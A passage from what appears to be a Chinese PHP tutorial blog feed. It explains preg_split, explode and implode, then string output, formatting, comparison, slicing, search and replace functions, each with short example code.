title="preg_split：通过一个正则表达式分隔字符串"></a>preg_split：通过一个正则表达式分隔字符串</h4></li><li><p><code>PREG_SPLIT_NO_EMPTY</code>：返回分隔后的非空部分</p></li><li><p><code>PREG_SPLIT_DELIM_CAPTURE</code>：用于分隔的模式中的括号表达式将被捕获并返回. </p></li><li><p><code>PREG_SPLIT_OFFSET_CAPTURE</code>：返回附加字符串偏移量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//按任意数量的空格和逗号分隔字符串，其中包含<span class="string">&quot; &quot;</span>, \r, \t, \n and \f</span><br><span class="line"><span class="variable">$keywords</span> = preg_split (<span class="string">&quot;/[\s,]+/&quot;</span>, <span class="string">&quot;hypertext language, programming&quot;</span>);</span><br><span class="line">print_r(<span class="variable">$keywords</span>);     </span><br><span class="line">//分割后输出Array ( [0] =&gt; hypertext [1] =&gt; language [2] =&gt; programming ) </span><br><span class="line"></span><br><span class="line">//将字符串分割成字符</span><br><span class="line"><span class="variable">$chars</span> = preg_split(<span class="string">&#x27;//&#x27;</span>, <span class="string">&quot;lamp&quot;</span>, -1, PREG_SPLIT_NO_EMPTY);</span><br><span class="line">print_r(<span class="variable">$chars</span>);        //分割后输出Array ( [0] =&gt; l [1] =&gt; a [2] =&gt; m [3] =&gt; p ) </span><br><span class="line"></span><br><span class="line">//将字符串分割为匹配项及其偏移量</span><br><span class="line"><span class="variable">$chars</span> = preg_split(<span class="string">&#x27;/ /&#x27;</span>,<span class="string">&#x27;hypertext language programming&#x27;</span>, -1, </span><br><span class="line">PREG_SPLIT_OFFSET_CAPTURE);</span><br><span class="line">print_r(<span class="variable">$chars</span>);    </span><br><span class="line"></span><br><span class="line">/* 分割后输出:</span><br><span class="line">    Array ( [0] =&gt; Array ( [0] =&gt; hypertext [1] =&gt; 0 ) </span><br><span class="line">               [1] =&gt; Array ( [0] =&gt; language [1] =&gt; 10 ) </span><br><span class="line">               [2] =&gt; Array ( [0] =&gt; programming [1] =&gt; 19 ) )     */</span><br></pre></td></tr></table></figure><h4 id="explode：使用一个字符串分割另一个字符串"><a href="#explode：使用一个字符串分割另一个字符串" class="headerlink" title="explode：使用一个字符串分割另一个字符串"></a>explode：使用一个字符串分割另一个字符串</h4><p><code>array explode(string $separator,string $string[,int $limit])</code><br>此函数返回由字符串组成的数组，每个元素都是 <code>string</code>的一个子串，它们被字符串 <code>separator</code>作为边界点分割出来。 其中<code>$limit</code>是指定对大分割个数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$lamp</span> = <span class="string">&quot;Linux Apache MySQL PHP&quot;</span>;   //声明一个字符串<span class="variable">$lamp</span>，每个单词之间使用空格分割</span><br><span class="line"><span class="variable">$lampbrother</span> = explode(<span class="string">&quot; &quot;</span>, <span class="variable">$lamp</span>); //将字符串<span class="variable">$lamp</span>使用空格分割，并组成数组返回</span><br><span class="line"></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;redhat:*:500:508::/home/redhat:/bin/bash&quot;</span>; //将Linux中的用户文件的一行提出</span><br><span class="line">//按“：”分割7个子串,并存放对对应的变量中.</span><br><span class="line">list(<span class="variable">$user</span>, <span class="variable">$pass</span>, <span class="variable">$uid</span>, <span class="variable">$gid</span>, , <span class="variable">$home</span>, <span class="variable">$shell</span>) = explode(<span class="string">&quot;:&quot;</span>, <span class="variable">$password</span>);  </span><br><span class="line"></span><br><span class="line">//声明字符串<span class="variable">$lamp</span>，每个单词之间使用加号“+”分割</span><br><span class="line"><span class="variable">$lamp</span> = <span class="string">&quot;Linux+Apache+MySQL+PHP&quot;</span>;  </span><br><span class="line">//使用正数限制子串个数，而最后那个元素将包含 <span class="variable">$lamp</span>中 的剩余部分</span><br><span class="line">print_r(explode(<span class="string">&#x27;+&#x27;</span>, <span class="variable">$lamp</span>, 2));  //输出Array ( [0] =&gt; Linux [1] =&gt; Apache+MySQL+PHP )</span><br><span class="line">//使用负数限制子串，则返回除了最后的限制个元素外的所有元素</span><br><span class="line">print_r(explode(<span class="string">&#x27;+&#x27;</span>, <span class="variable">$lamp</span>, -1));  //输出Array ( [0] =&gt; Linux [1] =&gt; Apache [2] =&gt; MySQL )</span><br></pre></td></tr></table></figure><h4 id="implode：使用一个子串组装一个数组。"><a href="#implode：使用一个子串组装一个数组。" class="headerlink" title="implode：使用一个子串组装一个数组。"></a>implode：使用一个子串组装一个数组。</h4><p><code>string implode(string $glue,array $pieces)</code><br>将<code>pieces</code>数组中的每个值，使用<code>glue</code>作为分隔符组装成一个子串并返回。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$lamp</span> = array(<span class="string">&quot;Linux&quot;</span>, <span class="string">&quot;Apache&quot;</span>, <span class="string">&quot;MySQL&quot;</span>, <span class="string">&quot;PHP&quot;</span>);</span><br><span class="line"><span class="built_in">echo</span> implode(<span class="string">&quot;+&quot;</span>, <span class="variable">$lamp</span>);      //使用加号连接后输出Linux+Apache+MySQL+PHP</span><br><span class="line"><span class="built_in">echo</span> join(<span class="string">&quot;+++&quot;</span>, <span class="variable">$lamp</span>);        //使用三个加号连接后输出Linux+++Apache+++MySQL+++PHP</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;PHP中的正则表达式&quot;&gt;&lt;a href=&quot;#PHP中的正则表达式&quot; class=&quot;headerlink&quot; title=&quot;PHP中的正则表达式&quot;&gt;&lt;/a&gt;PHP中的正则表达式&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;在php中，有两套正则表达式函数库，两者功能相似、知识执行效率略有差异：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;PCRE&lt;/code&gt;库提供，使用&lt;code&gt;preg_&lt;/code&gt;为前缀命名的函数&lt;/li&gt;
&lt;li&gt;&lt;code&gt;POSIX&lt;/code&gt;扩展提供的。使用以&lt;code&gt;ereg_&lt;/code&gt;为前缀命名的函数&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;PCRE&lt;/code&gt;来源于&lt;code&gt;Perl&lt;/code&gt;语言，而Perl是对字符串操作功能最强大的语言之一，&lt;code&gt;PHP&lt;/code&gt;的最初版本就是由&lt;code&gt;Perl&lt;/code&gt;开发的产品。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;PCRE&lt;/code&gt;语法支持更多特性，比&lt;code&gt;POSIX&lt;/code&gt;语法更强大。&lt;/p&gt;
&lt;h3 id=&quot;与Perl语言兼容的正则表达式处理函数&quot;&gt;&lt;a href=&quot;#与Perl语言兼容的正则表达式处理函数&quot; class=&quot;headerlink&quot; title=&quot;与Perl语言兼容的正则表达式处理函数&quot;&gt;&lt;/a&gt;与Perl语言兼容的正则表达式处理函数&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;&lt;strong&gt;函数名&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;功能描述&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;&lt;strong&gt;preg_match()&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;进行正则表达式匹配&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;&lt;strong&gt;preg_match_all()&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;进行全局正则表达式匹配&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;&lt;strong&gt;preg_replace()&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;执行正则表达式的搜索和替换&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;&lt;strong&gt;preg_split()&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;用正则表达式分割字符串&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;&lt;strong&gt;preg_grep()&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;返回与模式匹配的数组单元&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;&lt;strong&gt;preg_replace_callback&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;用回调函数执行正则表达式的搜索和替换&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h2 id=&quot;正则表达式语法规则&quot;&gt;&lt;a href=&quot;#正则表达式语法规则&quot; class=&quot;headerlink&quot; title=&quot;正则表达式语法规则&quot;&gt;&lt;/a&gt;正则表达式语法规则&lt;/h2&gt;&lt;p&gt;正则表达式作为一个匹配的模板，是由原子（普通字符，例如字符a到z）、特殊字符（元字符，例如*、+和？等）、以及模式修正符三部分组成的匹配模板。&lt;/p&gt;
&lt;h3 id=&quot;定界符&quot;&gt;&lt;a href=&quot;#定界符&quot; class=&quot;headerlink&quot; title=&quot;定界符&quot;&gt;&lt;/a&gt;定界符&lt;/h3&gt;</summary>
    
    
    
    <category term="PHP基础" scheme="https://hzktester.top/categories/PHP%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="PHP基础" scheme="https://hzktester.top/tags/PHP%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>字符串介绍，常用字符串输出函数、格式化函数、比较函数</title>
    <link href="https://hzktester.top/posts/e0d73a1e.html"/>
    <id>https://hzktester.top/posts/e0d73a1e.html</id>
    <published>2020-11-06T09:09:00.000Z</published>
    <updated>2020-11-06T09:11:23.549Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是字符串"><a href="#什么是字符串" class="headerlink" title="什么是字符串"></a>什么是字符串</h2><blockquote><p>在C语言中字符串是作为字节数组处理的。在Java语言中字符串是作为对象处理的。而php则把字符串作为基本数据类型来处理。通常对字符串的处理涉及字符串的格式化。字符串的分割和连接、字符串的比较、以及字符串的查找、匹配和替换。</p></blockquote><h2 id="常用的字符串输出函数"><a href="#常用的字符串输出函数" class="headerlink" title="常用的字符串输出函数"></a>常用的字符串输出函数</h2><h3 id="常规输出字符串"><a href="#常规输出字符串" class="headerlink" title="常规输出字符串"></a>常规输出字符串</h3><ul><li><code>echo()</code>：输出字符串</li><li><code>print()</code>：输出一个字符串<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$array &#x3D; [1,2,3];</span><br><span class="line">$string &#x3D; &quot;123&quot;;</span><br><span class="line">&#x2F;&#x2F;echo $array;</span><br><span class="line">echo $string;</span><br><span class="line">&#x2F;&#x2F;print($array);</span><br><span class="line">print($string);</span><br></pre></td></tr></table></figure><code>echo()</code>和<code>print()</code>都只能输出字符串，而不能输出数组<h3 id="输出字符串并退出程序"><a href="#输出字符串并退出程序" class="headerlink" title="输出字符串并退出程序"></a>输出字符串并退出程序</h3><code>die()和exit()</code>：输出一个字符串后退出程序<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$string &#x3D; &quot;123&quot;;</span><br><span class="line">&#x2F;&#x2F;die($string);</span><br><span class="line">exit($string);</span><br><span class="line">echo &quot;我不会运行&quot;;</span><br></pre></td></tr></table></figure><code>die()</code>和<code>exit()</code>同样都只能输出字符串，而不能输出数组<h3 id="格式化输出字符串"><a href="#格式化输出字符串" class="headerlink" title="格式化输出字符串"></a>格式化输出字符串</h3>字符串转换格式：</li></ul><table><thead><tr><th>格式</th><th>作用</th></tr></thead><tbody><tr><td>%%</td><td>返回百分比符号</td></tr><tr><td>%b</td><td>二进制数</td></tr><tr><td>%c</td><td>依照ASCII值的字符</td></tr><tr><td>%d</td><td>带符号十进制数</td></tr><tr><td>%e</td><td>可续计数法（如1.5e3）</td></tr><tr><td>%u</td><td>无符号十进制数</td></tr><tr><td>%f或%F</td><td>浮点数</td></tr><tr><td>%o</td><td>八进制数</td></tr><tr><td>%s</td><td>字符串</td></tr><tr><td>%x或%X</td><td>十六进制数</td></tr></tbody></table><ul><li><code>printf()</code>：输出格式化字符串</li><li><code>sprintf()</code>：把格式化的字符串写入一个变量中</li></ul><p><code>printf()</code>和<code>sprintf()</code>都是格式化输出字符串，区别在于<code>sprintf()</code>可以把格式化的字符串写入到一个变量中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;我是%s&quot;,&quot;test&quot;);    &#x2F;&#x2F;输出我是test</span><br><span class="line">$aa &#x3D; sprintf(&quot;我是%s&quot;,&quot;test&quot;);</span><br><span class="line">echo $aa;   &#x2F;&#x2F;输出我是test</span><br></pre></td></tr></table></figure><h2 id="常用的字符串格式化函数"><a href="#常用的字符串格式化函数" class="headerlink" title="常用的字符串格式化函数"></a>常用的字符串格式化函数</h2><h3 id="去除空格和字符串填充函数"><a href="#去除空格和字符串填充函数" class="headerlink" title="去除空格和字符串填充函数"></a>去除空格和字符串填充函数</h3><ul><li><code>ltrim()</code>：删去字符串前面的空格</li><li><code>rtrim()</code>：删去字符串后面的空格</li><li><code>trim()</code>：删去字符串前后的空格  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   $info &#x3D; &quot; 我前面有个空格&quot;;</span><br><span class="line">$info1 &#x3D; &quot;我后面有个空格 &quot;;</span><br><span class="line">$info2 &#x3D; &quot; 我前后有个空格 &quot;;</span><br><span class="line">var_dump(ltrim($info));&#x2F;&#x2F;去除字符串前面的空格</span><br><span class="line">var_dump(rtrim($info1));&#x2F;&#x2F;去除字符串后面的空格</span><br><span class="line">var_dump(trim($info2));&#x2F;&#x2F;去除字符串前后的空格</span><br></pre></td></tr></table></figure></li><li><code>str_pad()</code>：按需求对字符串进行填充<ul><li><code>STR_PAD_LEFT</code>：字符串左填补</li><li><code>STR_PAD_RIGHT</code>：字符串右填补</li><li><code>STR_PAD_BOTH</code>：字符串左右两端填补<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   $input &#x3D; &quot;Alien&quot;;</span><br><span class="line">var_dump(str_pad($input, 10));&#x2F;&#x2F; 输出&quot;Alien     &quot;</span><br><span class="line">var_dump(str_pad($input, 10, &quot;-&#x3D;&quot;, STR_PAD_LEFT));&#x2F;&#x2F; 输出 &quot;-&#x3D;-&#x3D;-Alien&quot;</span><br><span class="line">var_dump(str_pad($input, 10, &quot;_&quot;, STR_PAD_BOTH));&#x2F;&#x2F; 输出 &quot;__Alien___&quot;</span><br><span class="line">var_dump(str_pad($input, 6 , &quot;___&quot;));&#x2F;&#x2F; 输出&quot;Alien_&quot;</span><br></pre></td></tr></table></figure><h3 id="字符串大小写的转换"><a href="#字符串大小写的转换" class="headerlink" title="字符串大小写的转换"></a>字符串大小写的转换</h3></li></ul></li><li><code>strtolower()</code>：将字符串全部转换为小写字符串</li><li><code>strtoupper()</code>：将字符串全部转换为大写字符串</li><li><code>ucfirst()</code>：将字符串第一个字符改大写</li><li><code>ucwords()</code>：将字符串每个字第一个字母改大写  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$info &#x3D; &quot;ABCDEFG HIJFLNM&quot;;</span><br><span class="line">&#x2F;&#x2F; 转换成小写</span><br><span class="line">$info &#x3D; strtolower($info);</span><br><span class="line">var_dump($info);</span><br><span class="line">&#x2F;&#x2F; 转换成大写</span><br><span class="line">var_dump(strtoupper($info));</span><br><span class="line">&#x2F;&#x2F; 把首字母变成大写</span><br><span class="line">var_dump(ucfirst($info));</span><br><span class="line">&#x2F;&#x2F; 每个字第一个字母改大写。</span><br><span class="line">var_dump(ucwords($info));</span><br></pre></td></tr></table></figure>  <img src="https://qiniu.hzktester.top/tp2020110608.png" alt="image"><h3 id="和HTML标签相关联的字符串格式化"><a href="#和HTML标签相关联的字符串格式化" class="headerlink" title="和HTML标签相关联的字符串格式化"></a>和HTML标签相关联的字符串格式化</h3></li><li><code>nl2br()</code>：将字符串中<code>\n</code>转成HTML换行符<code>&lt;br/&gt;</code>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$html &#x3D; &quot;我要换行\n&quot;;</span><br><span class="line">var_dump(nl2br($html));</span><br></pre></td></tr></table></figure>  <img src="https://qiniu.hzktester.top/tp2020110609.png" alt="image"></li><li><code>htmlspecialchars()</code>：把指定特殊符号转换成实体，如&lt;&gt;  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$html &#x3D; &quot;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;我是开始&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&quot;;</span><br><span class="line">$shilihuahtml &#x3D; htmlspecialchars($html);</span><br><span class="line">var_dump($shilihuahtml);</span><br></pre></td></tr></table></figure>  <img src="https://qiniu.hzktester.top/tp2020110610.png" alt="image"></li><li><code>htmlspecialchars_decode()</code>：实体转换为<code>html</code></li><li><code>strip_tags()</code>：删除<code>html</code>的标签函数  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   $html &#x3D; &quot;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;我是开始&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&quot;;</span><br><span class="line">   var_dump(strip_tags($html));&#x2F;&#x2F;删除全部html代码，输出string(12) &quot;我是开始&quot;</span><br><span class="line">var_dump(strip_tags($html,&quot;&lt;title&gt;&quot;));&#x2F;&#x2F;只保留title标签,标题会显示我是开始</span><br></pre></td></tr></table></figure>  <img src="https://qiniu.hzktester.top/tp2020110611.png" alt="image"><h3 id="其他字符串格式化函数"><a href="#其他字符串格式化函数" class="headerlink" title="其他字符串格式化函数"></a>其他字符串格式化函数</h3></li><li><code>strrev()</code>：颠倒字符串，将字符串前后颠倒</li><li><code>strlen()</code>：取得字符串长度</li><li><code>number_format()</code>：格式货币、数字、时间等</li><li><code>md5()</code>：md5加密函数  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; &quot;123456&quot;;</span><br><span class="line">&#x2F;&#x2F;颠倒字符串</span><br><span class="line">var_dump(strrev($a));</span><br><span class="line">&#x2F;&#x2F; 获取字符串的长度</span><br><span class="line">var_dump(strlen($a));</span><br><span class="line">&#x2F;&#x2F;格式货币、数字、时间等。</span><br><span class="line">$number &#x3D; 1234.5678;</span><br><span class="line">var_dump(number_format($number,2,&#39;.&#39;,&#39;&#39;));</span><br><span class="line">&#x2F;&#x2F;md5加密</span><br><span class="line">var_dump(md5($a));</span><br></pre></td></tr></table></figure>  <img src="https://qiniu.hzktester.top/tp2020110612.png" alt="image"></li></ul><h2 id="字符串比较函数"><a href="#字符串比较函数" class="headerlink" title="字符串比较函数"></a>字符串比较函数</h2><h3 id="字符串的比较"><a href="#字符串的比较" class="headerlink" title="字符串的比较"></a>字符串的比较</h3><ul><li><code>strcmp()</code>：字符串整个比较是否相同</li><li><code>strncmp()</code>：指定比较长度的字符串比较</li><li><code>strcasecmp()</code>：不区分大小写的字符串比较</li><li><code>strnatcmp()</code>：按自然排序法对字符串比较</li><li><code>similar_text()</code>：字符串的模糊比较，返回相似字符串的个数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var_dump(strcmp(&#39;ABCcc&#39;,&#39;ABccc&#39;));&#x2F;&#x2F;int(-1)</span><br><span class="line">var_dump(strncmp(&#39;ABCcc&#39;,&#39;ABccc&#39;,6));&#x2F;&#x2F;int(-1)</span><br><span class="line">var_dump(strcasecmp(&#39;ABCcc&#39;,&#39;ABccc&#39;));&#x2F;&#x2F;int(0)</span><br><span class="line">var_dump(strnatcmp(&#39;ABCcc&#39;,&#39;ABccc&#39;));&#x2F;&#x2F;int(-1)</span><br><span class="line">var_dump(similar_text(&#39;ABCcc&#39;,&#39;ABCcc&#39;));&#x2F;&#x2F;int(5)</span><br></pre></td></tr></table></figure><h3 id="字符串的分割与拼装"><a href="#字符串的分割与拼装" class="headerlink" title="字符串的分割与拼装"></a>字符串的分割与拼装</h3></li><li><code>explode()</code>：使用一个字符串分割另一个字符串，返回一个数组  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   $pizza &#x3D; &quot;piece1 piece2 piece3&quot;;</span><br><span class="line">$pieces &#x3D; explode(&quot; &quot;, $pizza); &#x2F;&#x2F;用空格分隔pizza变量组成数组赋值给pieces</span><br><span class="line">echo $pieces[0]; &#x2F;&#x2F; piece1</span><br><span class="line">echo $pieces[1]; &#x2F;&#x2F; piece2</span><br><span class="line">   echo $pieces[2];    &#x2F;&#x2F; piece3</span><br></pre></td></tr></table></figure></li><li><code>implode()</code>：用一组较小的字符串创建一个大字符串  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$array &#x3D; array(&#39;lastname&#39;,&#39;email&#39;,&#39;phone&#39;);</span><br><span class="line">$comma_separated &#x3D; implode(&quot;,&quot;,$array); &#x2F;&#x2F;使用,分割array的每个值组成一个字符串</span><br><span class="line">echo $comma_separated; &#x2F;&#x2F;输出lastname,email,phone</span><br></pre></td></tr></table></figure><h3 id="字符串的截取、查找、替换"><a href="#字符串的截取、查找、替换" class="headerlink" title="字符串的截取、查找、替换"></a>字符串的截取、查找、替换</h3><h4 id="截取"><a href="#截取" class="headerlink" title="截取"></a>截取</h4></li><li><code>substr()</code>：取部分字符串，返回一个新的字符串</li><li><code>strstr()</code>：截取字符串某个参数第一次出现到结尾的字符串</li><li><code>strrchr()</code>：截取字符串某个参数最后一次出现到结尾的字符串</li></ul><h4 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h4><ul><li><code>strpos()</code>：寻找字符串某个参数最先出现的位置</li><li><code>strrpos()</code>：寻找字符串某个参数最后出现的位置</li></ul><h4 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h4><ul><li><code>str_replace()</code>：替换字符串</li></ul><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$info &#x3D; &quot;ABCDEFG HIJFLNM&quot;;</span><br><span class="line">&#x2F;&#x2F;截取</span><br><span class="line">var_dump(substr($info,4,7));&#x2F;&#x2F;从字符串第4位开始，截取7位</span><br><span class="line">var_dump(strstr($info,&#39;F&#39;));&#x2F;&#x2F;截取字符串第一个F开始到结尾的字符串</span><br><span class="line">var_dump(strrchr($info,&#39;F&#39;));&#x2F;&#x2F;截取字符串最后一个F开始到结尾的字符串</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查找</span><br><span class="line">var_dump(strpos($info,&#39;F&#39;));&#x2F;&#x2F;寻找字符串F最先出现的位置，返回下标，默认从0开始</span><br><span class="line">var_dump(strrpos($info,&#39;F&#39;));&#x2F;&#x2F;寻找字符串F最后一次出现的位置，返回下标，默认从0开始</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;替换</span><br><span class="line">var_dump($info);</span><br><span class="line">var_dump(str_replace([&quot;A&quot;,&quot;B&quot;], [&quot;2&quot;,&quot;4&quot;], $info));&#x2F;&#x2F;把字符串A和B分别替换为2和4</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020110613.png" alt="image"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;什么是字符串&quot;&gt;&lt;a href=&quot;#什么是字符串&quot; class=&quot;headerlink&quot; title=&quot;什么是字符串&quot;&gt;&lt;/a&gt;什么是字符串&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;在C语言中字符串是作为字节数组处理的。在Java语言中字符串是作为对象处理的。而php则把字符串作为基本数据类型来处理。通常对字符串的处理涉及字符串的格式化。字符串的分割和连接、字符串的比较、以及字符串的查找、匹配和替换。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;常用的字符串输出函数&quot;&gt;&lt;a href=&quot;#常用的字符串输出函数&quot; class=&quot;headerlink&quot; title=&quot;常用的字符串输出函数&quot;&gt;&lt;/a&gt;常用的字符串输出函数&lt;/h2&gt;&lt;h3 id=&quot;常规输出字符串&quot;&gt;&lt;a href=&quot;#常规输出字符串&quot; class=&quot;headerlink&quot; title=&quot;常规输出字符串&quot;&gt;&lt;/a&gt;常规输出字符串&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;echo()&lt;/code&gt;：输出字符串&lt;/li&gt;
&lt;li&gt;&lt;code&gt;print()&lt;/code&gt;：输出一个字符串&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$array &amp;#x3D; [1,2,3];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$string &amp;#x3D; &amp;quot;123&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#x2F;&amp;#x2F;echo $array;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;echo $string;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#x2F;&amp;#x2F;print($array);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print($string);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
